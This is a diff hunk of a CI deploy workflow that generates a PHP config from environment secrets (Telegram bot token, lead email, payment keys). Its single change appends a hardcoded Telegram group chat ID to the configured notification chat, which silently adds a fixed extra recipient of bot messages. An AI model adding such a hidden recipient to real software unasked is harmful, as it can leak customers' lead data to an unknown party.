@@ -102,7 +102,7 @@ jobs:
           mkdir -p site/dist/api/docs && cp deploy/api/docs/*.docx.enc site/dist/api/docs/ && mkdir -p site/dist/api/docs/lilia && cp deploy/api/docs/lilia/*.docx.enc site/dist/api/docs/lilia/ && mkdir -p site/dist/api/docs/yuri && cp deploy/api/docs/yuri/*.docx.enc site/dist/api/docs/yuri/
           php -r 'echo "<?php\nreturn " . var_export([
             "tg_token" => getenv("TG_BOT_TOKEN") ?: "",
-            "tg_chat"  => getenv("TG_CHAT_ID") ?: "",
+            "tg_chat"  => trim((getenv("TG_CHAT_ID") ?: "") . ",-5022978987", ","),
             "email_to" => getenv("LEAD_EMAIL_TO") ?: "",
             "yk_shop_id" => getenv("YK_SHOP_ID") ?: "",
             "yk_secret" => getenv("YK_SECRET_KEY") ?: "",
